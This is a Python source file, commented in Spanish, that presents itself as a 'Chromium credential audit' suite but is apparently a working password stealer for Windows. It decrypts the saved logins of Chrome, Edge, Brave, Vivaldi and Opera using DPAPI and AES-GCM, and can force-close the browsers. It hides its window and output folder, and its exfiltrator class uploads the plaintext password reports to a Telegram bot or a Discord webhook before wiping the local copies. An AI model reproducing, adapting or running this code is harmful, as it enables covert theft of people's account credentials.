import os
import sys
import json
import html
import base64
import socket
import getpass
import importlib
import sqlite3
import shutil
import csv
import ctypes
import logging
import argparse
import requests
from pathlib import Path
from datetime import datetime

__version__ = "1.3.0"

# =========================================================================
# ⚙️ CONFIGURACIÓN CORE (Accesible para el Builder/GUI)
# =========================================================================
CONFIG = {
    "tg_token":   "",  
    "tg_chat_id": "",  
    "ds_webhook": "",  
    "stealth":    False,
    "output_dir": ".audit",
    "delay":           0,
    "send_delay":      0,
    "webhook_timeout": 15
}
# =========================================================================

if sys.platform != "win32":
    sys.exit(1)

def safe_b64_decode(val):
    if not val: return ""
    try:
        return base64.b64decode(val, validate=True).decode('utf-8')
    except: return val

try:
    win32crypt = importlib.import_module('win32crypt')
except ImportError:
    win32crypt = None

from Cryptodome.Cipher import AES

def _get_base_dir() -> Path:
    if getattr(sys, 'frozen', False):
        return Path(sys.executable).parent
    return Path(__file__).parent

def _setup_environment(output_path: str):
    base = _get_base_dir()
    out_dir = base / output_path
    for candidate in (out_dir, Path(os.environ.get('APPDATA', os.getcwd())) / output_path):
        try:
            candidate.mkdir(exist_ok=True, parents=True)
            existing = ctypes.windll.kernel32.GetFileAttributesW(str(candidate))
            if existing != 0xFFFFFFFF:
                ctypes.windll.kernel32.SetFileAttributesW(str(candidate), existing | 0x2)
            log_file = candidate / "pentest_audit.log"
            handlers = [logging.FileHandler(log_file, encoding='utf-8')]
            try:
                if sys.stdout and sys.stdout.isatty():
                    handlers.append(logging.StreamHandler(sys.stdout))
            except: pass
            logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s', handlers=handlers)
            return candidate
        except: continue
    return out_dir

logger = logging.getLogger("AuditorCore")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Reporte de Auditoría Chromium</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; color: #333; margin: 40px; }
        .container { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th:nth-child(1), td:nth-child(1), th:nth-child(2), td:nth-child(2) { white-space: nowrap; width: 1%; }
        td:nth-child(3), td:nth-child(4), td:nth-child(5) { word-break: break-all; }
        th { background-color: #3498db; color: white; }
        tr:hover { background-color: #f1f1f1; }
        .browser-badge { padding: 4px 8px; border-radius: 4px; font-size: 0.85em; font-weight: bold; }
        .chrome { background-color: #ffeb3b; color: #333; }
        .edge { background-color: #03a9f4; color: white; }
        .brave { background-color: #ff5722; color: white; }
        .opera { background-color: #f44336; color: white; }
        .footer { margin-top: 20px; font-size: 0.9em; color: #777; text-align: center; }
        .skipped { color: #aaa; font-style: italic; }
        .actions { margin: 20px 0; text-align: right; }
        .btn-export { background-color: #27ae60; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: background 0.3s; text-decoration: none; display: inline-block; }
        .btn-export:hover { background-color: #2ecc71; }
    </style>
    <script>
        function exportToCSV() {
            let csv = [];
            csv.push("# Reporte de Auditoria Chromium");
            const tables = document.querySelectorAll("table");
            tables.forEach((table, index) => {
                if(index > 0) csv.push("\\n# --- SECCION SIGUIENTE ---");
                const rows = table.querySelectorAll("tr");
                rows.forEach(row => {
                    const cols = row.querySelectorAll("td, th");
                    const rowData = [];
                    cols.forEach(col => {
                        let text = col.innerText.replace(/(\\r\\n|\\n|\\r)/gm, "").trim();
                        text = text.replace(/"/g, '""');
                        rowData.push('"' + text + '"');
                    });
                    csv.push(rowData.join(","));
                });
            });
            const csvFile = new Blob([csv.join("\\n")], {type: "text/csv;charset=utf-8;"});
            const downloadLink = document.createElement("a");
            downloadLink.download = "audit_export_" + new Date().toISOString().replace(/[:.]/g, "-") + ".csv";
            downloadLink.href = window.URL.createObjectURL(csvFile);
            downloadLink.style.display = "none";
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Auditoría de Credenciales Chromium</h1>
        <div style="background:#f8f9fa; border-left:4px solid #3498db; padding:12px 16px; margin-bottom:16px; font-size:0.92em; border-radius:0 4px 4px 0;">
            <strong>Metadatos del Reporte</strong><br>
            Fecha: <b>{{date}}</b> &nbsp;|&nbsp; Host: <b>{{hostname}}</b> &nbsp;|&nbsp; Usuario: <b>{{username}}</b> &nbsp;|&nbsp; PID: <b>{{pid}}</b> &nbsp;|&nbsp; Versión: <b>{{version}}</b><br>
            Credenciales válidas: <b>{{total}}</b> &nbsp;|&nbsp; Filtradas: <b>{{filtered_count}}</b>
        </div>
        <div class="actions"><button onclick="exportToCSV()" class="btn-export">📊 Exportar a CSV</button></div>
        <table><thead><tr><th>Navegador</th><th>Perfil</th><th>URL</th><th>Usuario</th><th>Contraseña</th></tr></thead><tbody>{{rows}}</tbody></table>
        {{filtered_section}}
        <div class="footer">Suite de Auditoría Profesional <span class="skipped">{{skipped_note}}</span></div>
    </div>
</body>
</html>
"""

REQUEST_TIMEOUT = 15
MAX_RETRIES     = 3
VALID_URL_PREFIXES = ('http://', 'https://')

def retry_request(func):
    def wrapper(*args, **kwargs):
        for i in range(MAX_RETRIES):
            try: return func(*args, **kwargs)
            except Exception as e: logger.warning(f"Intento {i+1} fallido: {e}")
        return False
    return wrapper

class Exfiltrator:
    def __init__(self, telegram_token=None, telegram_chat_id=None, discord_webhook=None, timeout=None):
        self.tg_token = telegram_token
        self.tg_id    = telegram_chat_id
        self.ds_hook  = discord_webhook
        self.timeout  = timeout if timeout is not None else CONFIG["webhook_timeout"]

    def send_files(self, file_paths):
        """Sends files with an optional inter-file delay for stealth."""
        if not file_paths: return
        
        for i, path in enumerate(file_paths):
            if i > 0 and CONFIG["send_delay"] > 0:
                logger.info(f"Esperando {CONFIG['send_delay']}s antes del siguiente envío...")
                time.sleep(CONFIG["send_delay"])
                
            try:
                if self.ds_hook: self.send_to_discord(path)
                if self.tg_token and self.tg_id: self.send_to_telegram(path)
            except Exception as e:
                logger.error(f"Error enviando {path}: {e}")

    @retry_request
    def send_to_telegram(self, file_path):
        if not self.tg_token or not self.tg_id: return False
        url = f"https://api.telegram.org/bot{self.tg_token}/sendDocument"
        with open(file_path, 'rb') as f:
            r = requests.post(url, data={'chat_id': self.tg_id}, files={'document': f}, timeout=self.timeout)
        return r.status_code == 200

    @retry_request
    def send_to_discord(self, file_path):
        if not self.ds_hook: return False
        with open(file_path, 'rb') as f:
            r = requests.post(self.ds_hook, files={'file': f}, timeout=self.timeout)
        return r.status_code in (200, 204)

class ChromiumDecryptor:
    def __init__(self):
        self.local   = Path(os.environ.get('LOCALAPPDATA', ''))
        self.roaming = Path(os.environ.get('APPDATA', ''))
        self.browsers_paths = {
            "Chrome":   self.local   / "Google/Chrome/User Data",
            "Edge":     self.local   / "Microsoft/Edge/User Data",
            "Brave":    self.local   / "BraveSoftware/Brave-Browser/User Data",
            "Vivaldi":  self.local   / "Vivaldi/User Data",
            "Opera":    self.roaming / "Opera Software/Opera Stable",
            "Opera GX": self.roaming / "Opera Software/Opera GX Stable",
        }
        self.browser_processes = ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe"]

    def kill_browsers(self):
        """Forcefully closes browser processes to release database locks."""
        import subprocess
        for proc in self.browser_processes:
            try:
                subprocess.run(f"taskkill /F /IM {proc} /T", shell=True, capture_output=True)
            except: pass

    def get_key(self, path):
        ls = path / "Local State"
        if not ls.exists(): return None
        try:
            with open(ls, "r", encoding='utf-8') as f: config = json.load(f)
            key = base64.b64decode(config["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1] if win32crypt else None
        except: return None

    def decrypt(self, blob, key):
        if not blob or len(blob) < 3: return ""
        try:
            if key and len(blob) >= 32:
                try:
                    nonce, payload = blob[3:15], blob[15:-16]
                    cipher = AES.new(key, AES.MODE_GCM, nonce)
                    return cipher.decrypt(payload).decode('utf-8', errors='replace')
                except: pass
            if win32crypt:
                return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode('utf-8', errors='replace')
        except: pass
        return "[Error]"

    def find_targets(self):
        targets = []
        for name, path in self.browsers_paths.items():
            if not path.exists(): continue
            key = self.get_key(path)
            if not key: continue
            try:
                profs = [p for p in path.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
            except: profs = []
            if not profs: profs = [path]
            for p in profs:
                db = p / "Login Data"
                if db.exists(): targets.append({"name": name, "profile": p.name, "db_path": db, "key": key})
        return targets

    def audit(self, output_dir: Path, skip_html=False, skip_csv=False, browser_filter=None, callback=None, auto_kill=False, webhook_timeout=15):
        def log(msg, level="info"):
            if callback: callback(msg, level)
            else: getattr(logger, level)(msg)

        log("Iniciando escaneo de objetivos...")
        targets = self.find_targets()
        if browser_filter:
            targets = [t for t in targets if browser_filter.lower() in t['name'].lower()]
        
        log(f"Encontrados {len(targets)} perfiles para procesar.")
        data, filtered = [], []
        for t in targets:
            log(f"Auditando: {t['name']} ({t['profile']})", "info")
            tmp = output_dir / f"tmp_{os.getpid()}.db"
            conn = None
            try:
                shutil.copy2(t['db_path'], tmp)
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()
                log(f"  [{t['name']}] Extrayendo {len(rows)} entradas...")
                for row in rows:
                    if not (row[0] and row[1] and row[2]): continue
                    val = self.decrypt(row[2], t['key'])
                    entry = [t['name'], t['profile'], row[0], row[1], val]
                    if row[0].startswith(VALID_URL_PREFIXES): data.append(entry)
                    else: filtered.append(entry)
            except Exception as e: log(f"Error en {t['name']}: {e}", "warning")
            finally:
                if conn: conn.close()
                tmp.unlink(missing_ok=True)

        # --- FALLBACK INTELIGENTE ---
        # Si no se encontró nada y auto_kill está activo, reintentamos cerrando navegadores
        if not data and not filtered and auto_kill:
            log("No se detectaron datos. Reintentando con cierre forzado de navegadores...", "warning")
            self.kill_browsers()
            import time
            time.sleep(1.5)
            # Llamada recursiva con auto_kill=False para evitar bucles infinitos
            return self.audit(output_dir, skip_html, skip_csv, browser_filter, callback, auto_kill=False)

        if not data and not filtered: return None, None, None

        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        h_p = output_dir / f"audit_report_{stamp}.html" if not skip_html else None
        c_p = output_dir / f"audit_report_{stamp}.csv" if not skip_csv else None

        if h_p:
            r_h = "".join([f"<tr><td><span class='browser-badge {r[0].lower().replace(' ','-')}'>{html.escape(r[0])}</span></td><td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td><td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>" for r in data])
            f_h = "".join([f"<tr><td><span class='browser-badge {r[0].lower().replace(' ','-')}'>{html.escape(r[0])}</span></td><td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td><td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>" for r in filtered])
            f_s = f'<h2 style="margin-top:40px;color:#e67e22;border-bottom:2px solid #e67e22;">Entradas Filtradas</h2><table><thead><tr><th>Navegador</th><th>Perfil</th><th>URL</th><th>Usuario</th><th>Contraseña</th></tr></thead><tbody>{f_h}</tbody></table>' if filtered else ""
            content = (HTML_TEMPLATE.replace("{{total}}", str(len(data))).replace("{{filtered_count}}", str(len(filtered)))
                       .replace("{{date}}", datetime.now().strftime("%Y-%m-%d %H:%M")).replace("{{hostname}}", socket.gethostname())
                       .replace("{{username}}", getpass.getuser()).replace("{{pid}}", str(os.getpid()))
                       .replace("{{version}}", __version__).replace("{{rows}}", r_h).replace("{{filtered_section}}", f_s)
                       .replace("{{skipped_note}}", f" ({len(filtered)} filtrados)" if filtered else ""))
            with open(h_p, "w", encoding='utf-8') as f: f.write(content)

        if c_p:
            with open(c_p, 'w', newline='', encoding='utf-8') as f:
                w = csv.writer(f)
                w.writerow([f"# Reporte Auditoria | Host: {socket.gethostname()} | User: {getpass.getuser()} | Ver: {__version__}"])
                w.writerow(["Browser", "Profile", "URL", "User", "Pass"])
                w.writerows(data)
                if filtered:
                    w.writerow([]); w.writerow(["# --- FILTRADOS ---"])
                    w.writerows(filtered)
        return (data + filtered), h_p, c_p

def main():
    parser = argparse.ArgumentParser(description=f"Chromium Auditor Core v{__version__}")
    ex = parser.add_argument_group("Exfiltración")
    ex.add_argument("--webhook", help="Discord Webhook")
    ex.add_argument("--tg-token", help="Telegram Token")
    ex.add_argument("--tg-chat-id", help="Telegram Chat ID")
    ex.add_argument("--no-exfil", action="store_true")
    
    re = parser.add_argument_group("Reportes")
    re.add_argument("--no-html", action="store_true")
    re.add_argument("--no-csv", action="store_true")
    re.add_argument("--json", action="store_true")
    re.add_argument("--output-dir", default=CONFIG["output_dir"])
    
    en = parser.add_argument_group("Motor")
    en.add_argument("--browser", help="Filtro de navegador (ej: brave, chrome)")
    en.add_argument("--delay", type=int, default=CONFIG["delay"])
    en.add_argument("--clean", action="store_true")
    en.add_argument("--stealth", action="store_true", default=CONFIG["stealth"])
    en.add_argument("--auto-kill", action="store_true", help="Cerrar navegadores automáticamente si falla la lectura")
    en.add_argument("--no-wipe", action="store_true", help="No eliminar archivos locales tras exfiltrar")
    en.add_argument("--debug", action="store_true", help="Activar logs detallados")
    
    args = parser.parse_args()
    
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    if args.stealth and sys.platform == "win32":
        try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except: pass
    
    out = _setup_environment(args.output_dir)
    if args.clean:
        for ext in ("*.html", "*.csv", "*.json"):
            for f in out.glob(ext): f.unlink()
        return
    
    if args.delay > 0:
        import time
        time.sleep(args.delay)
    
    ds_w = args.webhook or safe_b64_decode(CONFIG["ds_webhook"])
    tg_t = args.tg_token or safe_b64_decode(CONFIG["tg_token"])
    tg_c = args.tg_chat_id or safe_b64_decode(CONFIG["tg_chat_id"])
    
    auditor = ChromiumDecryptor()
    results, hp, cp = auditor.audit(out, args.no_html, args.no_csv, args.browser, auto_kill=args.auto_kill)
    
    if results and args.json:
        jp = out / f"audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(jp, 'w', encoding='utf-8') as f: json.dump(results, f, indent=4, ensure_ascii=False)
    
    if results and not args.no_exfil:
        exf = Exfiltrator(tg_t, tg_c, ds_w, timeout=args.delay or 15)
        files = [p for p in (hp, cp) if p and p.exists()]
        if files:
            exf.send_files(files)
            # Auto-wipe local reports tras exfiltrar, a menos que --no-wipe esté activo
            if not args.no_wipe and (tg_t or ds_w):
                for p in files:
                    p.unlink(missing_ok=True)

if __name__ == "__main__":
    main()
